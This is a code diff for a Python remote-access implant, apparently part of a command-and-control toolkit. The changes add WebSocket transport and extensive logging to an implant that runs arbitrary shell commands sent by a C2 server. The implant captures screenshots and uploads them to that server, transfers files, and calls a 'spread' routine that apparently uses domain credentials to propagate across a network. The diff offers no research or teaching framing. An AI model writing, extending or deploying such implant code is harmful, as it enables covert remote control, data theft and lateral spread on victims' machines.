@@ -41,7 +41,16 @@ class Implant:
         self.domain_user = domain_user
         self.domain_password = domain_password
         self.implant_id = str(uuid.uuid4())
-        self.sio = socketio.Client(reconnection=True, reconnection_attempts=5)
+        
+        # Configure socket.io client with WebSocket transport
+        self.sio = socketio.Client(
+            reconnection=True,
+            reconnection_attempts=5,
+            transport='websocket',
+            logger=True,
+            engineio_logger=True
+        )
+        
         self.command_queue = queue.Queue()
         self.running = True
         self.connected = False
@@ -104,24 +113,11 @@ class Implant:
             logger.error(f"Registration failed: {e}")
             self.sio.disconnect()
     
-    def reconnect(self):
-        """Attempt to reconnect to the C2 server"""
-        if not self.running:
-            return
-            
-        logger.info("Attempting to reconnect...")
-        try:
-            if not self.sio.connected:
-                self.sio.connect(self.c2_url)
-        except Exception as e:
-            logger.error(f"Reconnection failed: {e}")
-            time.sleep(5)
-            if self.running:
-                self.reconnect()
-    
     def execute_command(self, command):
         """Execute a command and return the result"""
         try:
+            logger.info(f"Processing command: {command}")
+            
             if command.startswith('upload '):
                 return self.handle_upload(command[7:])
             elif command.startswith('download '):
@@ -130,6 +126,7 @@ class Implant:
                 return self.handle_screenshot()
             else:
                 # Execute shell command
+                logger.info(f"Executing shell command: {command}")
                 process = subprocess.Popen(
                     command,
                     shell=True,
@@ -139,20 +136,29 @@ class Implant:
                     encoding='utf-8',
                     errors='replace'
                 )
-                stdout, stderr = process.communicate(timeout=30)
                 
-                # Format command output
-                output = []
-                if stdout:
-                    output.append("STDOUT:")
-                    output.append(stdout)
-                if stderr:
-                    output.append("STDERR:")
-                    output.append(stderr)
+                try:
+                    stdout, stderr = process.communicate(timeout=30)
+                    logger.info(f"Command completed with return code: {process.returncode}")
+                    
+                    # Format command output
+                    output = []
+                    if stdout:
+                        output.append("STDOUT:")
+                        output.append(stdout)
+                    if stderr:
+                        output.append("STDERR:")
+                        output.append(stderr)
+                    
+                    result = "\n".join(output) if output else "Command executed successfully (no output)"
+                    logger.info(f"Command output length: {len(result)}")
+                    return result
+                    
+                except subprocess.TimeoutExpired:
+                    logger.warning(f"Command timed out: {command}")
+                    process.kill()
+                    return "Command timed out after 30 seconds"
                 
-                return "\n".join(output) if output else "Command executed successfully (no output)"
-        except subprocess.TimeoutExpired:
-            return "Command timed out after 30 seconds"
         except Exception as e:
             logger.error(f"Command execution failed: {e}")
             return f"Error executing command: {str(e)}"
@@ -192,6 +198,7 @@ class Implant:
     def handle_screenshot(self):
         """Take a screenshot and send it to the C2 server"""
         try:
+            logger.info("Taking screenshot...")
             # Take screenshot
             screenshot = ImageGrab.grab()
             
@@ -204,6 +211,7 @@ class Implant:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"screenshot_{self.hostname}_{timestamp}.png"
             
+            logger.info(f"Uploading screenshot as {filename}")
             # Upload to C2 server
             files = {'file': (filename, img_byte_arr)}
             response = requests.post(
@@ -212,17 +220,20 @@ class Implant:
             )
             
             if response.status_code == 200:
-                # Return both success message and filename for the web interface
+                logger.info("Screenshot uploaded successfully")
                 return json.dumps({
                     'status': 'success',
                     'message': 'Screenshot captured and uploaded successfully',
                     'filename': filename
                 })
+            
+            logger.error(f"Failed to upload screenshot: {response.status_code}")
             return json.dumps({
                 'status': 'error',
                 'message': f"Failed to upload screenshot: {response.status_code}"
             })
         except Exception as e:
+            logger.error(f"Screenshot failed: {e}")
             return json.dumps({
                 'status': 'error',
                 'message': f"Screenshot failed: {str(e)}"
@@ -290,29 +301,50 @@ class Implant:
         while self.running:
             try:
                 command = self.command_queue.get(timeout=1)
-                if command == "spread":
-                    result = self.spread_to_domain()
-                else:
-                    result = self.execute_command(command)
+                logger.info(f"Executing command: {command}")
                 
-                # Send result back to C2 server
-                self.sio.emit('command_result', {
-                    'implant_id': self.implant_id,
-                    'command': command,
-                    'result': result,
-                    'timestamp': datetime.now().isoformat()
-                })
+                try:
+                    if command == "spread":
+                        result = self.spread_to_domain()
+                    else:
+                        result = self.execute_command(command)
+                    
+                    # Send result back to C2 server
+                    if self.connected:
+                        self.sio.emit('command_result', {
+                            'implant_id': self.implant_id,
+                            'command': command,
+                            'result': result,
+                            'timestamp': datetime.now().isoformat()
+                        })
+                        logger.info(f"Command result sent: {command}")
+                    else:
+                        logger.error("Cannot send command result: Not connected to C2 server")
+                except Exception as e:
+                    logger.error(f"Error executing command {command}: {e}")
+                    if self.connected:
+                        self.sio.emit('command_result', {
+                            'implant_id': self.implant_id,
+                            'command': command,
+                            'result': f"Error executing command: {str(e)}",
+                            'timestamp': datetime.now().isoformat()
+                        })
             except queue.Empty:
                 continue
             except Exception as e:
                 logger.error(f"Command worker error: {e}")
+                time.sleep(1)  # Prevent tight loop on error
     
     def start(self):
         """Start the implant"""
         try:
-            # Connect to C2 server
-            logger.info(f"Connecting to C2 server at {self.c2_url}")
-            self.sio.connect(self.c2_url)
+            # Connect to C2 server with WebSocket transport
+            logger.info(f"Connecting to C2 server at {self.c2_url} using WebSocket transport")
+            self.sio.connect(
+                self.c2_url,
+                transports=['websocket'],
+                wait_timeout=10
+            )
             
             # Start command worker thread
             worker_thread = threading.Thread(target=self.command_worker)
@@ -334,6 +366,25 @@ class Implant:
             logger.error(f"Implant error: {e}")
             self.running = False
             self.sio.disconnect()
+
+    def reconnect(self):
+        """Attempt to reconnect to the C2 server"""
+        if not self.running:
+            return
+            
+        logger.info("Attempting to reconnect using WebSocket transport...")
+        try:
+            if not self.sio.connected:
+                self.sio.connect(
+                    self.c2_url,
+                    transports=['websocket'],
+                    wait_timeout=10
+                )
+        except Exception as e:
+            logger.error(f"Reconnection failed: {e}")
+            time.sleep(5)
+            if self.running:
+                self.reconnect()
 
 if __name__ == '__main__':
     # Get C2 server URL from command line or use default
